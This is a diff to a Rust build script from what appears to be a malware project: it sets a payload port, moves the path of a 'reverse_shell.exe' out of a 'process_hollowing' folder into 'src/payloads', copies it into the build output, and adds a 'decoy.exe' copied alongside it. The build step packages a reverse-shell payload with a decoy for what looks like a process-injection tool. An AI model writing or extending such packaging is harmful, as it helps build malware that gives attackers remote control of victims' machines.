@@ -10,11 +10,16 @@ fn main() {
         println!("cargo:rustc-env=PAYLOAD_PORT={}", port);
     }
 
-    let payload_src = "src/process_hollowing/reverse_shell.exe";
+    let payload_src = "src/payloads/reverse_shell.exe";
     let out_dir = env::var("OUT_DIR").expect("OUT_DIR not set");
     let payload_dst = Path::new(&out_dir).join("reverse_shell.exe");
 
     fs::copy(payload_src, &payload_dst).expect("failed to copy reverse_shell.exe");
-
+    
+    let decoy_src = "src/payloads/decoy.exe";
+    let out_dir = env::var("OUT_DIR").expect("OUT_DIR not set");
+    let decoy_dst = Path::new(&out_dir).join("decoy.exe");
+    fs::copy(decoy_src, &decoy_dst).expect("failed to copy decoy.exe");
+    
     println!("cargo:rerun-if-changed={}", payload_src);
 }
